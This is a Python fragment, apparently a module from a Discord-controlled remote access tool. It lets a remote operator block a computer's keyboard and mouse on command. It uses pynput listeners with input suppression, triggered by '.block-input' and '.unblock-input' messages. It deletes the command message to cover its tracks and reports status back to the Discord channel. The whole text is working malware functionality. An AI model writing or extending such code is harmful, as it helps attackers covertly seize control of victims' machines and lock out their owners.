from pynput import keyboard, mouse
import discord

class Listeners:
    def __init__(self):
        self.keyboard_listener = keyboard.Listener(suppress=True)
        self.mouse_listener = mouse.Listener(suppress=True)
        self.is_running = False

    def start(self):
        if not self.is_running:
            self.keyboard_listener.start()
            self.mouse_listener.start()
            self.is_running = True

    def stop(self):
        if self.is_running:
            self.keyboard_listener.stop()
            self.mouse_listener.stop()
            self.is_running = False

listeners = Listeners()

async def handle_block_unblock_input(message):
    content, colour = '', discord.Colour.red()

    if message.content == '.block-input':
        if not listeners.is_running:
            await message.delete()  #.log Removed the message
            listeners.start()  #.log Disabled keyboard & mouse
            content, colour = 'Input has been blocked. Unblock it by using .unblock-input', discord.Colour.red()
        else:
            content = 'The input is already blocked. Unblock it by using .unblock-input'

    elif message.content == '.unblock-input':
        if listeners.is_running:
            await message.delete()  #.log Removed the message
            listeners.stop()  #.log Unblocked keyboard & mouse
            content, colour = 'Input has been unblocked. Block it by using .block-input', discord.Colour.green()
        else:
            content = 'The input is not blocked. Block it by using .block-input'
    
    title = "ğŸš« Input Blocked" if colour == discord.Colour.red() else "ğŸŸ¢ Input Unblocked"
    embed = discord.Embed(title=title, description=f'```{content}```', colour=colour)
    return await message.channel.send(embed=embed)

# on message
if message.content in ['.block-input', '.unblock-input']:
    await handle_block_unblock_input(message)
